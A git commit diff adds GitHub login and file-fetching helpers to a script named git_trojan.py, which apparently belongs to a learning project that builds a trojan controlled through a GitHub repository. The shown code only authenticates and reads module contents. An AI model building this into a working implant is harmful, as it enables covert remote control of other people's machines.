5bd846bb1904b7be84fb6a00bb4fb77deda61909
Eric Ardiansa <ericardiansa@gmail.com>
2024-02-27 15:36:37 +0700

    adding code

--- git_trojan.py
+++ git_trojan.py
@@ -9,3 +9,13 @@ import time
 
 from datetime import datetime
 
+#function to connect to github
+def github_connect():
+    with open('mytoken.txt') as f:
+        token = f.read()
+        user = 'ericardiansa'
+        sess = github3.login(token=token)
+        return sess.repositories(user, 'Learn-Trojan')
+#function to get file contents from repositories
+def get_file_contents(dirname,module_name, repo):
+    return repo.file_contents(f'{dirname}/{module_name}').content
